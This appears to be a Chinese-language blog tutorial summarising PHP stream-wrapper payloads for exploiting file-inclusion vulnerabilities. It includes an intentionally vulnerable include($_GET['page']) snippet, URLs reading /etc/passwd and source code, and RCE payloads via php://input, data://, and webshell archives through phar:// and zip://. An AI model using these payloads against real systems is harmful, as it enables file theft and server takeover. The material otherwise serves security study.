+++
date = '2026-04-21T15:29:15Z'
draft = false
title = 'PHP伪协议'
categories = ["基础知识"]
tags = ["PHP", "伪协议", "文件包含"]
+++

# 一、文件包含漏洞可用 PHP 伪协议 汇总表

|伪协议|语法格式|核心功能（文件包含场景）|依赖 / 条件|
|--|--|--|--|
|file://     |	file://绝对路径 file://相对路径	                         | 读取本地文件（最基础、最常用）           |  无依赖，默认开启      |
|php://filter|	php://filter/read=convert.base64-encode/resource=文件名	| 读取文件源码（绕过 PHP 执行，直接看代码） |  无依赖，默认开启      |
|php://input |	php://input	                                            | POST 数据当作 PHP 代码执行（RCE 核心）  |  allow_url_include=On |
|data://     |	data://text/plain;base64,编码内容	                    | 直接执行 PHP 代码（无文件上传也能 RCE）   |  allow_url_include=On | 
|phar://	 |  phar://压缩包路径/内部文件                               | 读取压缩包内文件 / 代码执行（配合上传）   |	PHP >=5.3.0          |
|zip://	     |  zip://压缩包路径#内部文件                                | 读取 zip 压缩包内文件                   |  无特殊依赖            |
|expect://   |  expect://系统命令                                       | 直接执行系统命令（高危，极少开启）        |  需安装扩展            |


# 二、伪协议详解

环境前提：

存在文件包含漏洞页面：http://www.example.com/index.php?page=xxx

漏洞代码：

```php
<?php
$page = $_GET['page'];
include($page);  // 无过滤，直接包含
?>
```

1. file:// 

功能：读取本地服务器任意文件，是 LFI 最基础用法。

```text
?page=file://C:/Windows/System32/drivers/etc/hosts      # Windows
?page=file:///etc/passwd                                # Linux
?page=file://./config.php                               # 相对路径
```

file:// 是本地文件访问伪协议，直接写路径读取文件内容。

优点：默认必开，无需任何配置

用途：读取配置文件、日志文件、密码文件等

2. php://filter 

功能：读取 PHP 文件源码（只读不执行），绕过 PHP 解析，直接看到源代码。

```text
?page=php://filter/read=convert.base64-encode/resource=index.php
```

注意：必须加 convert.base64-encode：把源代码使用Base64 编码然后输出，否则会被服务器直接执行，看不到源码

流程：读取文件 → Base64 编码 → 输出到页面 → 自行解码得到源码

文件包含漏洞中最常用、最实用，用于泄露网站源码

3. php://input

功能：把 POST 请求体内容当作 PHP 代码执行，实现命令执行 / 拿 Shell。

```plaintext
?page=php://input
```

POST 数据（请求体里写）：

使用Hackbar/BurpSuite修改POST的内容

```php
<?php phpinfo(); ?>
```
php://input = 读取原始 POST 数据

include 会把 POST 数据当作 PHP 文件执行

条件：allow_url_include = On

用途：无文件上传情况下,通过POST内容直接操作服务器

4. data://

功能：直接在 URL 里写入 PHP 代码并执行，GET 型 RCE。

明文（部分环境会被拦截）：

```plaintext
?page=data://text/plain,<?php phpinfo();?>
```

Base64 编码（绕过过滤）：

```plaintext
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

data:// 把协议后面的内容当作文件内容,编码后更稳定，可绕过关键词过滤。

条件：allow_url_include = On

5. phar://

功能：读取 zip/rar/phar 压缩包内部文件，常用于上传图片马后改后缀，再用 phar 包含执行。

```plaintext
?page=phar://./upload/shell.zip/shell.php
```
格式：phar://压缩包路径/压缩包文件/内部文件

上传一个压缩包（shell.zip)，里面放一句话木马(shell.php),即使压缩包被改名为 shell.jpg，依然可以读取执行shell.php

6. zip://

功能：专门读取 .zip 压缩包内文件，用法和 phar 类似，但语法不同。

```plaintext
?page=zip://./upload/shell.zip%23shell.php
```

（# 要 URL 编码成 %23）

仅支持 zip 格式,路径分隔符必须用 #，URL编码为 %23

7. expect://

功能：直接执行系统命令，无需 PHP 代码。

```plaintext
?page=expect://id
```

必须安装 expect 扩展，现实环境几乎不存在，仅作了解。

# 三、关键配置

文件包含能否使用伪协议，取决于两个 PHP 配置：

allow_url_fopen = On

大部分伪协议依赖（默认开启）

allow_url_include = On

想要执行代码的伪协议（如：php://input、data://），必须开启这个配置

# 四、用途整理

读文件用 file://

读源码用 php://filter

POST 执行用 php://input

GET 执行用 data://

压缩包用 phar://、zip://

# 总结

文件包含漏洞中最核心的伪协议是：file://、php://filter、php://input、data://

读文件用 file / filter，执行代码用 input / data

所有伪协议的本质：让 include () 函数读取 / 执行你指定的内容

复现漏洞时优先用 php://filter 读源码，成功率最高